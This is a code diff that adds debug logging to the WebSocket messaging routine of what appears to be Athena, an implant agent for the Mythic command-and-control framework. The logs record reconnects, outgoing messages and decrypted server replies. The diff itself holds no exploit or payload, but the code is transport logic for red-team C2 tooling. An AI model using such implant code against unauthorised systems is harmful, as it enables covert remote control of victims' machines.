@@ -11,6 +11,7 @@ using System.Threading.Tasks;
 using Athena.Models.Mythic.Checkin;
 using System.Text.Json.Serialization;
 using System.Text.Json.Serialization.Metadata;
+using System.Diagnostics;
 
 namespace Athena
 {
@@ -101,8 +102,11 @@ namespace Athena
         {
             if(this.ws.State != WebSocketState.Open)
             {
+                Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
                 await Connect(this.url);
             }
+
+            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
 
             try
             {
@@ -124,25 +128,27 @@ namespace Athena
 
                 string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
                 byte[] msg = Encoding.UTF8.GetBytes(message);
+                Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                 message = await Receive(ws);
 
                 if (String.IsNullOrEmpty(message))
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Response was empty.");
                     return String.Empty;
                 }
 
                 m = JsonSerializer.Deserialize<WebSocketMessage>(message, WebsocketJsonContext.Default.WebSocketMessage);
 
-
-
                 if (this.encrypted)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(m.Data)}");
                     return this.crypt.Decrypt(m.Data);
                 }
 
                 if (!string.IsNullOrEmpty(json))
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(m.Data).Result.Substring(36)}");
                     return (await Misc.Base64Decode(m.Data)).Substring(36);
                 }
 
